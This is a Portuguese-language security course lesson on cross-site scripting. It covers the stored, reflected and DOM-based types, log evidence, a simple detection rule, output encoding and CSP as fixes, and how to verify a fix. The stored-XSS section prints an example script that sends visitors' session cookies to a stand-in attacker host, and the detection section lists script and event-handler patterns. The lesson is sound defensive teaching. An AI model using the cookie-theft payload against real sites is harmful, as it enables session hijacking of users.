# Aula 2 (Módulo 18) — XSS (Cross-Site Scripting)

[![📄 Baixar PDF desta aula](https://img.shields.io/badge/📄_Baixar-PDF_desta_aula-2b6cb0?style=for-the-badge)](02-xss-cross-site-scripting.pdf)

## 1. O que é

**XSS** acontece quando uma aplicação web permite que **código
JavaScript malicioso** seja injetado e executado no **navegador de
outra pessoa** — diferente do SQLi (Aula 1), o alvo aqui não é o
servidor/banco de dados, é o **usuário** que visualiza a página.

## 2. Por que acontece

O mesmo erro central do SQLi, em outro contexto: a aplicação insere
dado do usuário diretamente na página HTML, sem **tratá-lo como
texto puro** (chamado de *output encoding* ou *sanitização*) — o
navegador não sabe diferenciar "isso é texto normal" de "isso é código
para executar".

## 3. Como funciona — os três tipos

### Stored XSS (armazenado)

O código malicioso é **salvo** no servidor (ex.: num comentário de
blog, numa mensagem de fórum) e executado **toda vez** que qualquer
outro usuário visualizar aquele conteúdo — o mais perigoso, porque
atinge **múltiplas vítimas automaticamente**, sem precisar enganar
ninguém a clicar em nada.

```html
<!-- Exemplo didático de payload, NUNCA execute contra sistema real -->
<script>document.location='https://atacante.exemplo/roubo?c='+document.cookie</script>
```

Se esse texto for salvo como um "comentário" e a página exibir
comentários sem tratamento, todo visitante que ver esse comentário
executa esse script — e, nesse exemplo, o script rouba o cookie de
sessão do visitante (lembra do Módulo 03, Aula 7, sobre roubo de cookie
= *session hijacking*?).

### Reflected XSS (refletido)

O código malicioso vem **na própria requisição** (ex.: um parâmetro de
URL) e é imediatamente **refletido** de volta na resposta, sem ser
salvo permanentemente. Exige que a vítima **clique em um link
específico** (frequentemente distribuído via phishing) contendo o
payload.

### DOM-based XSS

A injeção acontece inteiramente **no navegador**, através de
JavaScript da própria página manipulando o DOM (a estrutura da página)
de forma insegura com dado controlado pelo atacante — sem o payload
nunca "passar" pelo servidor de forma visível nos logs dele, o que
torna esse tipo particularmente mais difícil de detectar só olhando
logs de servidor.

## 4. Como reproduzir em laboratório

Novamente, **OWASP Juice Shop** e **DVWA** têm desafios específicos de
XSS (dos três tipos), desenhados propositalmente para prática segura.

## 5. Que evidências deixa

- **Logs de acesso web**: para Stored/Reflected XSS, o payload
  malicioso geralmente aparece registrado no log — tags `<script>`,
  `onerror=`, `javascript:` em parâmetros/corpo de requisição.
- **Dados armazenados na aplicação** (para Stored XSS): o próprio
  conteúdo salvo no banco de dados contém o payload — uma checagem de
  segurança comum é varrer o conteúdo já armazenado procurando por
  esses padrões.
- **DOM-based XSS**: raramente aparece em logs de servidor — a
  evidência fica mais no lado do navegador/cliente, tornando essencial
  o teste ativo (varredura automatizada) em vez de só análise passiva
  de log.

## 6. Como detectar

```
SE parâmetro de requisição OU conteúdo salvo contém:
   <script
   onerror=
   onload=
   javascript:
ENTÃO alertar — possível tentativa de XSS
```

Um WAF (Módulo 03, Aula 6) bem configurado normalmente bloqueia
padrões óbvios como esse automaticamente — embora atacantes
avançados usem técnicas de ofuscação (parecido em espírito com a
ofuscação de PowerShell do Módulo 17, Aula 1) para tentar escapar de
regras simples.

## 7. Como investigar

Se um payload de XSS é encontrado: ele foi **armazenado** (Stored) ou
só apareceu numa requisição isolada (Reflected/tentativa bloqueada)?
Se armazenado, **quantos usuários** já podem ter visualizado aquele
conteúdo e executado o script sem saber? O destino do script (para onde
ele tentava enviar dados roubados, como cookies) é conhecido/malicioso?

## 8. Como corrigir

A correção correta é **output encoding** — garantir que qualquer dado
do usuário, ao ser inserido na página, seja tratado como **texto
literal**, não como código HTML/JavaScript. A maioria dos frameworks
web modernos já faz isso **por padrão**, automaticamente, ao renderizar
dados dinâmicos — o erro geralmente acontece quando um desenvolvedor
explicitamente **desabilita** essa proteção padrão (funções como
`innerHTML` no JavaScript puro, ou marcações explícitas de "conteúdo
seguro/raw" em frameworks server-side) sem necessidade real.

Camada adicional de defesa: **Content Security Policy (CSP)** — um
cabeçalho HTTP que restringe de onde a página pode carregar/executar
JavaScript, reduzindo o impacto mesmo se uma injeção acontecer.

## 9. Como validar a correção

Reenvie o mesmo payload de teste e confirme que ele aparece na página
como **texto visível** (ex.: literalmente mostrando
`<script>alert(1)</script>` como texto na tela), em vez de ser
executado como código.

## Conectando com o resto do curso

```
Roubo de cookie via XSS → session hijacking (Módulo 03, Aula 7)
Detecção de padrão suspeito → mesmo princípio do SQLi (Aula 1) e do
                                Suricata (Módulo 04)
MITRE ATT&CK → T1189 (Drive-by Compromise), quando XSS é usado como
                vetor inicial de comprometimento do navegador da vítima
```

## Recapitulando

- XSS injeta JavaScript malicioso executado no navegador da vítima —
  Stored (persistente, múltiplas vítimas), Reflected (via link/clique)
  e DOM-based (só no lado do cliente).
- Evidência: payloads com `<script>`, `onerror=`, `javascript:` em
  requisições/conteúdo armazenado.
- Correção correta: output encoding (padrão na maioria dos frameworks
  modernos) + Content Security Policy como camada extra.

## Próxima aula (fecha o Módulo 18)

CSRF e IDOR/Broken Access Control — quando a vulnerabilidade não está
em "injetar código", mas em **abusar da confiança** entre navegador e
servidor, ou de controles de autorização mal implementados.

## Fontes recomendadas

- **OWASP — "Cross Site Scripting Prevention Cheat Sheet"**: guia
  oficial da OWASP sobre output encoding e prevenção de XSS.
  <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- **MDN Web Docs — "Content Security Policy (CSP)"**: documentação
  técnica oficial (Mozilla) sobre CSP.
  <https://developer.mozilla.org/docs/Web/HTTP/CSP>
- **MITRE ATT&CK — T1189 (Drive-by Compromise)**: técnica oficial
  relacionada. <https://attack.mitre.org/techniques/T1189/>
